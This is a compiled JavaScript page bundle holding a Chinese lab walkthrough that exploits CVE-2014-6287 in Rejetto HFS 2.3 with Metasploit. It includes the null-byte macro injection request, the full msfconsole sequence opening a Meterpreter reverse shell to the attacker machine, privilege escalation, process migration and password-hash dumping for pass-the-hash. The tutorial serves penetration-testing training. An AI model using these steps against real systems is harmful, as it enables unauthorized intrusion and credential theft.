(window.webpackJsonp=window.webpackJsonp||[]).push([[169],{623:function(e,s,t){"use strict";t.r(s);var a=t(24),r=Object(a.a)({},(function(){var e=this,s=e.$createElement,t=e._self._c||s;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h1",{attrs:{id:"metasploit攻击hfs2-3上的漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#metasploit攻击hfs2-3上的漏洞"}},[e._v("#")]),e._v(" Metasploit攻击HFS2.3上的漏洞")]),e._v(" "),t("p",[e._v("攻击机： kali 192.168.109.137")]),e._v(" "),t("p",[e._v("靶机： windows server 2012 192.168.109.141")]),e._v(" "),t("p",[e._v("工具：Metasploit")]),e._v(" "),t("p",[e._v("根据CVE-2014-6287的描述，Rejetto网络文件服务器(也被称为HSF或者HttpFileServer)的2.3x版本(2.3c以前的版本)中的parserLib.pas文件使用了一个findMacroMaker函数，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的%00序列利用该漏洞执行任意程序。")]),e._v(" "),t("p",[e._v("下面给出了这个有漏洞的函数：")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("function findMacroMarker(s:string; ofs:integer=1):integer;\nbegin result:=reMatch(s, '\\{[.:]|[.:]\\}|\\|', 'm!', ofs) end;\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br")])]),t("p",[e._v("这个函数不能正确的处理空字节，所以当我们对"),t("a",{attrs:{href:"http://localhost:80/search=",target:"_blank",rel:"noopener noreferrer"}},[e._v("http://localhost:80/search=%00"),t("OutboundLink")],1),e._v("{.exec|cmd.}发起请求时，就会停止对宏的正则解析，从而导致远程代码的注入。")]),e._v(" "),t("h2",{attrs:{id:"开启msf"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#开启msf"}},[e._v("#")]),e._v(" 开启MSF")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("msfconsole\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"渗透漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#渗透漏洞"}},[e._v("#")]),e._v(" 渗透漏洞")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("search hfs\nuse exploit/windows/http/rejetto_hfs_exec\nshow options\nset RHOST 192.168.109.141\nset RPORT 8080\nshow payloads\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.109.137\nset LPORT 4444\nshow options\nexploit\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br"),t("span",{staticClass:"line-number"},[e._v("3")]),t("br"),t("span",{staticClass:"line-number"},[e._v("4")]),t("br"),t("span",{staticClass:"line-number"},[e._v("5")]),t("br"),t("span",{staticClass:"line-number"},[e._v("6")]),t("br"),t("span",{staticClass:"line-number"},[e._v("7")]),t("br"),t("span",{staticClass:"line-number"},[e._v("8")]),t("br"),t("span",{staticClass:"line-number"},[e._v("9")]),t("br"),t("span",{staticClass:"line-number"},[e._v("10")]),t("br"),t("span",{staticClass:"line-number"},[e._v("11")]),t("br")])]),t("p",[e._v("此时，我们已经以管理员的身份获得了Windows server 2012系统的权限。")]),e._v(" "),t("h2",{attrs:{id:"将权限提升为系统级"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#将权限提升为系统级"}},[e._v("#")]),e._v(" 将权限提升为系统级")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("getsystem\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("h2",{attrs:{id:"查看系统进程和meterpreter正在驻留的进程号"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#查看系统进程和meterpreter正在驻留的进程号"}},[e._v("#")]),e._v(" 查看系统进程和Meterpreter正在驻留的进程号")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("ps\ngetpid\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br")])]),t("h2",{attrs:{id:"绑定meterpreter到其他进程"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#绑定meterpreter到其他进程"}},[e._v("#")]),e._v(" 绑定Meterpreter到其他进程")]),e._v(" "),t("p",[e._v("这里，为了保险起见，我们将Meterpreter的进程绑定到explorer.exe的进程号，这里，explorer.exe的进程号为1864,执行如下命令：")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("migrate 1864\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("此时，我们再次输入getpid命令查看，Meterpreter正在驻留的进程号变成了1864")]),e._v(" "),t("h2",{attrs:{id:"收集系统密码的哈希值"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#收集系统密码的哈希值"}},[e._v("#")]),e._v(" 收集系统密码的哈希值")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("hashdump\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("完成了哈希值的收集之后，就可以执行pass-the-hash攻击，在没有明文密码的情况下绕过限制。")])])}),[],!1,null,null,null);s.default=r.exports}}]);